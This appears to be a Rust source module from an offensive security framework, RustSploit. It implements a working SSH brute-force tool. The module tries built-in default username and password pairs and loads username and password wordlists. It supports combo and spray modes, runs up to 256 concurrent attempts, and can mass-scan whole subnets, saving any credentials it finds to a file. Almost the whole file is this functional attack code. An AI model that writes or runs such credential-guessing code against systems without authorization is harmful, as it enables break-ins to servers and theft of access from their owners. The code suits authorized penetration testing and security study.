use anyhow::{ anyhow, Context, Result };
use colored::*;
use ssh2::Session;
use std::{
    io::Write,
    net::{IpAddr,
    ToSocketAddrs},
    time::Duration,
};
use tokio::{
    task::spawn_blocking,
    time::timeout,
};

use crate::module::{ ModuleCtx, ModuleOutcome };
use crate::utils::{
    normalize_target,
    load_lines,
    get_filename_in_current_dir,
    cfg_prompt_default,
    cfg_prompt_yes_no,
    cfg_prompt_existing_file,
    cfg_prompt_port,
    cfg_prompt_output_file,
};
use crate::utils::wordlist;
use crate::utils::{
    BruteforceConfig,
    LoginResult,
    SubnetScanConfig,
    generate_combos_mode,
    parse_combo_mode,
    load_credential_file,
    run_bruteforce,
    run_subnet_bruteforce,
    is_subnet_target,
};

// Constants
const DEFAULT_SSH_PORT: u16 = 22;
const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("root", "root"),
    ("admin", "admin"),
    ("user", "user"),
    ("guest", "guest"),
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "password"),
    ("admin", "password"),
    ("root", ""),
    ("admin", ""),
    ("ubuntu", "ubuntu"),
    ("test", "test"),
    ("oracle", "oracle"),
];


pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "SSH Brute Force".to_string(),
        description: "Brute-force SSH authentication using username/password wordlists. Supports default credential testing, combo mode, concurrent connections, and subnet/mass scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx
        .target
        .as_single()
        .context("ssh_bruteforce requires a single-host target")?;
    crate::mprintln!("{}", "=== SSH Brute Force Module ===".bold());
    crate::mprintln!("[*] Target: {}", target);

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        let port: u16 = cfg_prompt_port("port", "SSH Port", DEFAULT_SSH_PORT).await?;

        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = if wordlist::should_stream(&usernames_file) {
            let mut lines = Vec::new();
            let mut reader = wordlist::BatchedReader::open(&usernames_file).await?;
            while let Some(batch) = reader.next_batch().await? {
                lines.extend(batch);
            }
            lines
        } else {
            load_lines(&usernames_file)?
        };
        let passes = if wordlist::should_stream(&passwords_file) {
            let mut lines = Vec::new();
            let mut reader = wordlist::BatchedReader::open(&passwords_file).await?;
            while let Some(batch) = reader.next_batch().await? {
                lines.extend(batch);
            }
            lines
        } else {
            load_lines(&passwords_file)?
        };
        if users.is_empty() { return Err(anyhow!("User list empty")); }
        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

        let concurrency: usize = {
            let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
            input.parse::<usize>().unwrap_or(10).max(1).min(256)
        };
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file("output_file", "Output result file", "ssh_subnet_results.txt").await?;

        let connection_timeout: u64 = {
            let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "5").await?;
            input.parse::<u64>().unwrap_or(5).max(1).min(60)
        };
        let timeout_duration = Duration::from_secs(connection_timeout);

        let limiter = ctx.limiter.clone();
        let module_path = ctx.module_path.clone();
        run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
            concurrency,
            verbose,
            output_file,
            service_name: "ssh",
            jitter_ms: 50,
            source_module: "creds/generic/ssh_credcheck",
            skip_tcp_check: false,
            state_file: None,
        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
            let timeout_dur = timeout_duration;
            let limiter = limiter.clone();
            let module_path = module_path.clone();
            async move {
                let host = ip.to_string();
                limiter.acquire(&module_path, &host).await;
                let addr = format!("{}:{}", ip, port);
                match try_ssh_login(&addr, &user, &pass, timeout_dur).await {
                    Ok(true) => LoginResult::Success,
                    Ok(false) => LoginResult::AuthFailed,
                    Err(e) => LoginResult::Error { message: e.to_string(), retryable: true },
                }
            }
        }).await?;
        return Ok(ModuleOutcome::ok());
    }

    // --- Single Target Mode ---
    let port: u16 = cfg_prompt_port("port", "SSH Port", DEFAULT_SSH_PORT).await?;

    // Ask about default credentials
    let use_defaults = cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;

    let usernames_file = if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
        Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
    } else {
        None
    };

    let builtin_lists = wordlist::catalogue();
    if !builtin_lists.is_empty() {
        crate::mprintln!("{}", format!("[*] Built-in wordlists available: {}", builtin_lists.join(", ")).dimmed());
    }

    let passwords_file = if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
        let file_input = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        // If input matches a built-in wordlist name, resolve it to a local path
        if !std::path::Path::new(&file_input).exists() {
            if let Ok(resolved) = wordlist::resolve(&file_input).await {
                crate::mprintln!("{}", format!("[*] Resolved built-in wordlist to: {}", resolved.display()).green());
                Some(resolved.to_string_lossy().to_string())
            } else {
                Some(file_input)
            }
        } else {
            Some(file_input)
        }
    } else {
        None
    };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!("At least one wordlist or default credentials must be enabled"));
    }

    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10").await?;
        input.parse::<usize>().unwrap_or(10).max(1).min(256)
    };

    let connection_timeout: u64 = {
        let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "5").await?;
        input.parse::<u64>().unwrap_or(5).max(1).min(60)
    };

    let retry_on_error = cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
    let max_retries: usize = if retry_on_error {
        let input = cfg_prompt_default("max_retries", "Max retries per attempt", "2").await?;
        input.parse::<usize>().unwrap_or(2).max(1).min(10)
    } else {
        0
    };

    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(cfg_prompt_output_file("output_file", "Output file", "ssh_brute_results.txt").await?)
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_input = cfg_prompt_default("combo_mode", "Combo mode (linear/combo/spray)", "combo").await?;

    let connect_addr = normalize_target(&format!("{}:{}", target, port)).unwrap_or_else(|_| format!("{}:{}", target, port));

    crate::mprintln!("\n{}", format!("[*] Starting brute-force on {}", connect_addr).cyan());

    // Load wordlists — use streaming reader for large files to avoid OOM
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        if wordlist::should_stream(file) {
            wordlist::for_each_batch(file, wordlist::DEFAULT_BATCH_SIZE, |batch| {
                usernames.extend(batch);
                async { Ok(()) }
            }).await?;
        } else {
            usernames = load_lines(file)?;
        }
        if usernames.is_empty() {
            crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
        } else {
            crate::mprintln!("{}", format!("[*] Loaded {} usernames", usernames.len()).green());
        }
    }

    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        if wordlist::should_stream(file) {
            wordlist::for_each_batch(file, wordlist::DEFAULT_BATCH_SIZE, |batch| {
                passwords.extend(batch);
                async { Ok(()) }
            }).await?;
        } else {
            passwords = load_lines(file)?;
        }
        if passwords.is_empty() {
            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            crate::mprintln!("{}", format!("[*] Loaded {} passwords", passwords.len()).green());
        }
    }

    // Add default credentials if requested
    if use_defaults {
        for (user, pass) in DEFAULT_CREDENTIALS {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        crate::mprintln!("{}", format!("[*] Added {} default credentials", DEFAULT_CREDENTIALS.len()).green());
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    let mut combos = generate_combos_mode(&usernames, &passwords, parse_combo_mode(&combo_input));
    if cfg_prompt_yes_no("cred_file", "Load additional user:pass combos from file?", false).await? {
        let cred_path = cfg_prompt_existing_file("cred_file_path", "Credential file (user:pass per line)").await?;
        combos.extend(load_credential_file(&cred_path)?);
    }
    let timeout_duration = Duration::from_secs(connection_timeout);

    let limiter = ctx.limiter.clone();
    let module_path = ctx.module_path.clone();
    let try_login = move |t: String, p: u16, user: String, pass: String| {
        let timeout_dur = timeout_duration;
        let limiter = limiter.clone();
        let module_path = module_path.clone();
        async move {
            limiter.acquire(&module_path, &t).await;
            let addr = normalize_target(&format!("{}:{}", t, p))
                .unwrap_or_else(|_| format!("{}:{}", t, p));
            match try_ssh_login(&addr, &user, &pass, timeout_dur).await {
                Ok(true) => LoginResult::Success,
                Ok(false) => LoginResult::AuthFailed,
                Err(e) => LoginResult::Error { message: e.to_string(), retryable: true },
            }
        }
    };

    let result = run_bruteforce(&BruteforceConfig {
        target: target.to_string(),
        port,
        concurrency,
        stop_on_success,
        verbose,
        delay_ms: 0,
        max_retries,
        service_name: "ssh",
        jitter_ms: 50,
        source_module: "creds/generic/ssh_credcheck",
    }, combos, try_login).await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored SSH responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no("save_unknown_responses", "Save unknown responses to file?", true).await? {
            let default_name = "ssh_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            ).await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# SSH Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(ModuleOutcome::ok())
}

async fn try_ssh_login(
    normalized_addr: &str,
    user: &str,
    pass: &str,
    timeout_duration: Duration,
) -> Result<bool> {
    let user_owned = user.to_string();
    let pass_owned = pass.to_string();
    let addr_owned = normalized_addr.to_string();

    let handle = spawn_blocking(move || {
            let socket_addr: std::net::SocketAddr = addr_owned.parse()
                .or_else(|_| addr_owned.to_socket_addrs().and_then(|mut a|
                    a.next().ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "No addresses resolved"))))
                .map_err(|e| anyhow!("Cannot resolve address {}: {}", addr_owned, e))?;
            let tcp = crate::utils::blocking_tcp_connect(&socket_addr, timeout_duration)
                .map_err(|e| anyhow!("Connection error: {}", e))?;
            tcp.set_read_timeout(Some(timeout_duration)).ok();
            tcp.set_write_timeout(Some(timeout_duration)).ok();

            let mut sess = Session::new()
                .map_err(|e| anyhow!("Failed to create SSH session: {}", e))?;
            sess.set_timeout(timeout_duration.as_millis() as u32);
            sess.set_tcp_stream(tcp);

            sess.handshake()
                .map_err(|e| anyhow!("SSH handshake failed: {}", e))?;

            sess.userauth_password(&user_owned, &pass_owned)
                .map_err(|e| anyhow!("Authentication failed: {}", e))?;

            Ok(sess.authenticated())
    });

    let join_result = timeout(timeout_duration, handle)
        .await
        .map_err(|_| anyhow!("Connection timeout"))?;

    join_result.map_err(|e| anyhow!("Join error: {}", e))?
}

crate::register_native_module!(crate::module::Category::Creds, "generic/ssh_bruteforce", native);
